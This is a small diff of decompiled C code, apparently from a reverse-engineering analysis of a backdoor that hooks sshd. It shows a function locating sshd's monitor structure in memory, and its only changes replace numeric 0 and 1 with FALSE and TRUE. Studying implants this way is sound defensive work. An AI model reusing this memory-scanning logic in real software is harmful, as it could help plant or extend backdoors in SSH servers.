@@ -38,10 +38,10 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
   void *local_78 [10];
   
   bVar9 = 0;
-  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,0);
-  if ((BVar1 != 0) && (local_d0 = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
+  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
+  if ((BVar1 != FALSE) && (local_d0 = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
     ctx->struct_monitor_ptr_address = (monitor **)0x0;
-    data_start_00 = (u8 *)elf_get_data_segment(elf,&local_d0,0);
+    data_start_00 = (u8 *)elf_get_data_segment(elf,&local_d0,FALSE);
     if (data_start_00 != (u8 *)0x0) {
       lVar6 = 0;
       data_end_00 = data_start_00 + local_d0;
@@ -102,10 +102,10 @@ LAB_00103f07:
       } while (uVar2 != 10);
       if ((4 < uVar3) && ((monitor **)local_78[uVar5] != (monitor **)0x0)) {
         ctx->struct_monitor_ptr_address = (monitor **)local_78[uVar5];
-        return 1;
+        return TRUE;
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
